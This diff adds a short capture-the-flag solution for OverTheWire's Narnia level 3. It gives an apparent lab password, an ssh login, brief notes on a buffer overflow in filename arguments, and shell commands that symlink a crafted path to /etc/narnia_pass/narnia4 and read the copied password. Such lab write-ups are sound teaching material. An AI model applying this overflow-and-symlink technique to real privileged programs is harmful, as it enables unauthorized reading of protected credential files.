@@ -1,0 +1,14 @@
+vaequeezee
+ssh narnia3@narnia.labs.overthewire.org -p 2226
+[the program takes 2 arguments, a target file and a source file]
+[using buffer overflow, we can write to the source file buffer and overwrite the target too]
+[problem: we can't use different strings for both, because null termination]
+[so we have to use one string with different starting points for both instead]
+[make sure that read and write rights are set correctly]
+[use symlink for ease of use :)]
+mkdir --parents /tmp/ä/aaaaaaaaaaaaaaaaaaaaaaaa/tmp/ä/a
+ln -s /etc/narnia_pass/narnia4 /tmp/ä/aaaaaaaaaaaaaaaaaaaaaaaa/tmp/ä/a
+chmod 777 /tmp/ä/*
+/narnia/narnia3 /tmp/ä/aaaaaaaaaaaaaaaaaaaaaaaa/tmp/ä/a
+cat /tmp/ä/a
+
